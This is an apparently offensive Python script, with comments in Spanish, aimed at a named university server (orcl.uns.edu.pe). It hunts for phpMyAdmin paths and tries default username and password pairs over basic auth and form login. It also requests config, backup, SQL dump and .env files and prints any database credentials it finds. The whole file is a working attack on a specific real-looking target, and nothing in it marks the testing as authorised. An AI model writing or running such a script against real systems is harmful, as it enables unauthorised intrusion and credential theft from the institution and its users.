#!/usr/bin/env python3
import requests, urllib3, re, urllib.parse, sys
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

# ============================================
# phpMyAdmin - ACCESO DIRECTO
# ============================================
print("=" * 70)
print("=== phpMyADMIN EN orcl.uns.edu.pe ===")
print("=" * 70)

# Try to access phpMyAdmin main page
r = s.get('https://orcl.uns.edu.pe/', timeout=10)
print(f"Main page: {r.status_code}, len={len(r.text)}")
tc = re.sub(r'<[^>]+>', ' ', r.text)
tc = re.sub(r'\s+', ' ', tc).strip()
print(f"Content: {tc[:500]}")

# Check if there's a login form for phpMyAdmin
if 'login' in tc.lower() and 'password' in tc.lower():
    print("\n[!] phpMyAdmin login form found!")
    # Find form action
    forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*>', r.text)
    print(f"Forms: {forms}")
    # Find inputs
    inputs = re.findall(r'<input[^>]*>', r.text)
    for inp in inputs[:10]:
        print(f"  {inp[:200]}")

# Try the index.php directly
r2 = s.get('https://orcl.uns.edu.pe/index.php', timeout=5)
print(f"\nindex.php: {r2.status_code}, len={len(r2.text)}")
tc2 = re.sub(r'<[^>]+>', ' ', r2.text)
tc2 = re.sub(r'\s+', ' ', tc2).strip()
print(f"Content: {tc2[:300]}")

# Try to find phpMyAdmin subdirectories
pma_paths = [
    '/', '/index.php', '/phpmyadmin/', '/phpMyAdmin/',
    '/pma/', '/mysql/', '/mysql/index.php',
    '/admin/', '/phpadmin/', '/mysqladmin/',
]
for path in pma_paths:
    url = f'https://orcl.uns.edu.pe{path}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and 'phpMyAdmin' in r.text:
            print(f"  [!] phpMyAdmin found: {url} -> {r.status_code}")
    except:
        pass

# ============================================
# Try default credentials on phpMyAdmin
# ============================================
print("\n=== INTENTANDO CREDENCIALES POR DEFECTO ===")

# First get the login page
r_login = s.get('https://orcl.uns.edu.pe/phpMyAdmin/index.php', timeout=5)
# Check for cookie-based auth
# Try different auth methods

# Method 1: Direct URL with credentials
creds = [
    ('root', ''),
    ('root', 'root'),
    ('admin', 'admin'),
    ('root', 'toor'),
    ('pma', 'pma'),
    ('phpmyadmin', 'phpmyadmin'),
]

for user, pwd in creds:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({'User-Agent': 'Mozilla/5.0'})
    # Try basic auth
    import base64
    auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    s2.headers['Authorization'] = f'Basic {auth}'
    r = s2.get('https://orcl.uns.edu.pe/phpMyAdmin/index.php', timeout=5)
    if r.status_code == 200 and 'phpMyAdmin' in r.text:
        # Check if logged in by looking for database info
        tc = re.sub(r'<[^>]+>', ' ', r.text)
        if 'mysql' in tc.lower() and 'database' in tc.lower() and 'login' not in tc.lower():
            print(f"  [!] ACCESO! {user}:{pwd}")
            break

# Method 2: POST to login form
# Get the login form first
r_form = s.get('https://orcl.uns.edu.pe/phpMyAdmin/index.php', timeout=5)
# Look for form fields
form_fields = re.findall(r'<input[^>]*name="([^"]+)"', r_form.text)
print(f"\nForm fields: {form_fields}")

# Try POST with form fields
for user, pwd in creds:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://orcl.uns.edu.pe/phpMyAdmin/index.php',
    })
    # Find the actual field names
    # phpMyAdmin typically uses: pma_username, pma_password
    data = {
        'pma_username': user,
        'pma_password': pwd,
        'server': '1',
    }
    r_post = s3.post('https://orcl.uns.edu.pe/phpMyAdmin/index.php',
                         data=data, timeout=5, allow_redirects=True)
    tc_post = re.sub(r'<[^>]+>', ' ', r_post.text)
    tc_post = re.sub(r'\s+', ' ', tc_post).strip()
    if 'mysql' in tc_post.lower() and 'database' in tc_post.lower():
        if 'login' not in tc_post.lower() or 'password' not in tc_post.lower():
            print(f"  [!] POST ACCESO! {user}:{pwd}")
            break

# ============================================
# Look for phpMyAdmin config
# ============================================
print("\n=== ARCHIVOS DE CONFIG DE phpMyAdmin ===")
config_files = [
    '/config.inc.php',
    '/config.inc.php.bak',
    '/config.php',
    '/libraries/config.default.php',
    '/libraries/common.inc.php',
    '/libraries/relation_cleanup.php',
]
for cfg in config_files:
    url = f'https://orcl.uns.edu.pe{cfg}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 50000:
            tc = r.text[:200]
            print(f"  [!] {url} -> {r.status_code}, len={len(r.text)}")
            if any(kw in tc.lower() for kw in ['password', 'passwd', 'secret', 'mysql', 'host', 'server']):
                print(f"      [!] CONTIENE CREDENCIALES!")
                print(f"      {tc[:200]}")
    except:
        pass

# ============================================
# Try to find MySQL credentials in PHP files
# ============================================
print("\n=== ARCHIVOS PHP CON CREDENCIALES ===")
php_files = [
    '/index.php', '/login.php', '/connect.php', '/db.php',
    '/config.php', '/functions.php', '/header.php',
    '/libraries/dbi/mysqli.dbi.lib.php',
    '/libraries/dbi/mysql.dbi.lib.php',
]
for pf in php_files:
    url = f'https://orcl.uns.edu.pe{pf}'
    try:
        r = s.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 0:
            tc = r.text[:200]
            if any(kw in tc.lower() for kw in ['password', 'passwd', 'mysql_connect', 'mysqli_connect', 'pdo', 'db_', 'hostname']):
                print(f"  [!] CREDENCIALES EN {url}")
                print(f"      {tc[:200]}")
    except:
        pass

# ============================================
# Try to find all accessible files on orcl.uns.edu.pe
# ============================================
print("\n=== ARCHIVOS ACCESIBLES EN orcl.uns.edu.pe ===")
more_files = [
    '/', '/index.php', '/phpinfo.php', '/phpinfo.php',
    '/info.php', '/phpmyadmin/', '/setup/', '/config/',
    '/admin/', '/db/', '/sql/', '/backup/',
    '/dump.sql', '/backup.sql', '/database.sql',
    '.env', 'config.php', 'database.php', 'connect.php',
    'settings.php', 'autoload.php',
]
for fp in more_files:
    url = f'https://orcl.uns.edu.pe{fp}'
    try:
        r = s.get(url, timeout=2)
        if r.status_code == 200 and len(r.text) > 100:
            tc = re.sub(r'<[^>]+>', ' ', r.text)
            tc = re.sub(r'\s+', ' ', tc).strip()
            has_db = any(kw in tc.lower() for kw in ['password', 'passwd', 'mysql', 'host', 'database', 'secret', 'key', 'credential'])
            print(f"  {url} -> {r.status_code}, len={len(r.text)} {'[DB INFO]' if has_db else ''}")
    except:
        pass

# ============================================
# Check orcl root more carefully
# ============================================
print("\n=== orcl.uns.edu.pe - ANALISIS DETALLADO ===")
r_root = s.get('https://orcl.uns.edu.pe/', timeout=10)
# Find all links and scripts
all_links = re.findall(r'<a[^>]*href="([^"]+)"', r_root.text)
all_scripts = re.findall(r'<script[^>]*src="([^"]+)"', r_root.text)
all_forms = re.findall(r'<form[^>]*action="([^"]+)"', r_root.text)
print(f"Links: {len(all_links)}")
for l in all_links[:20]:
    print(f"  {l}")
print(f"\nScripts: {len(all_scripts)}")
for sc in all_scripts[:10]:
    print(f"  {sc}")
print(f"\nForms: {len(all_forms)}")
for f in all_forms[:5]:
    print(f"  {f}")

# Look for any embedded PHP code or config
if '<?php' in r_root.text:
    print("\n[!] PHP code found in page!")
    php_matches = re.findall(r'<php[^>]*>(.*?)</php>', r_root.text, re.DOTALL)
    for m in php_matches[:5]:
        print(f"  {m[:200]}")

# Check for phpinfo() output
if 'phpinfo' in r_root.text.lower() or 'php_info' in r_root.text.lower():
    print("\n[!] phpinfo() detected!")

print("\n=== RESUMEN ===")
print("phpMyAdmin está expuesto pero necesita credenciales")
print("Config files pueden contener credenciales")
print("Buscar en el filesystem de orcl.uns.edu.pe")
